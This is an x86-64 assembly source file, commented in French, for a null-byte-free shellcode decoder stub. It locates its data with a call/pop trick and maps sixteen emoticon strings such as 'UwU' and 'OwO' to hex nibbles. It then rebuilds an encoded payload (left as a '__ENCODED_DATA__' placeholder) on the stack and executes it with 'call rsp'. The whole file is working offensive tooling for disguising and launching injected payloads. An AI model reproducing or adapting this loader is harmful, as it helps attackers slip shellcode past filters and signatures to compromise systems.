.intel_syntax noprefix
.section .text
.global _start

_start:
    # call/pop trick - call doit être COURT (< 0x7f offset)
    # donc on met les data JUSTE après
    call entry
# --- PROLOGUE_INSERT ---
data_start:
.ascii "UwU"
.ascii "OwO"
.ascii "TwT"
.ascii ">w<"
.ascii "^w^"
.ascii "QwQ"
.ascii "PwP"
.ascii "RwR"
.ascii "SwS"
.ascii "VwV"
.ascii "XwX"
.ascii "YwY"
.ascii "ZwZ"
.ascii "NwN"
.ascii "MwM"
.ascii "LwL"
encoded_data:
.ascii "__ENCODED_DATA__"
# Sentinelle NON-nulle : 0xFF (ne peut pas apparaître dans les keywords ASCII)
.byte 0xFF

entry:
    pop rbx               # rbx = &data_start
    mov r14, rbx          # r14 = keywords base
    lea rbx, [rbx + 48]   # rbx = &encoded_data

    # sub rsp sans null: 0x7878 = 30840, largement suffisant
    # mais on veut ~256: utiliser 0x101 ne marche pas...
    # Trick: push/push/sub via registre
    xor rax, rax
    mov al, 0x7f
    sub rsp, rax
    sub rsp, rax          # rsp -= 254, proche de 256
    
    mov r15, rsp

    xor r10, r10

main_loop:
    mov al, [rbx]
    # test contre 0xFF (sentinelle) au lieu de null
    cmp al, 0xFF
    je output_result
    mov al, [rbx+1]
    cmp al, 0xFF
    je output_result
    mov al, [rbx+2]
    cmp al, 0xFF
    je output_result

    mov al, [rbx]
    cmp al, 0x20
    je next_char
    cmp al, 0x2d
    je next_char

    call find_keyword      
    mov r10b, al
    shl r10b, 4
    inc rbx
    call find_keyword
    or r10b, al
    mov [r15], r10b
    inc r15
    jmp main_loop

next_char:
    inc rbx
    jmp main_loop

output_result:
    xor rax, rax
    mov [r15], al

    # exécuter
    call rsp
    xor rax, rax
    mov al, 0x7f
    add rsp, rax
    add rsp, rax
    ret

find_keyword:
    push r8
    push r9
    push r11
    push r12
    xor r11, r11
    xor r12, r12
    xor r8,  r8
    mov r11b, [rbx]
    mov r12b, [rbx+1]
    mov r8b,  [rbx+2]

    # mov r9, 15 sans null: push 15 / pop r9
    push 15
    pop r9

.search_loop:
    cmp r9, -1        
    je .not_found
    mov rax, r9
    lea rax, [rax + rax*2]
    xor rcx, rcx
    mov cl, [r14 + rax]
    cmp r11b, cl
    jne .next
    mov cl, [r14 + rax + 1]
    cmp r12b, cl
    jne .next
    mov cl, [r14 + rax + 2]
    cmp r8b, cl
    jne .next
    mov rax, r9
    jmp .found
.next:
    dec r9
    jmp .search_loop
.not_found:
    xor rax, rax
.found:
    add rbx, 3
    pop r12
    pop r11
    pop r9
    pop r8
    ret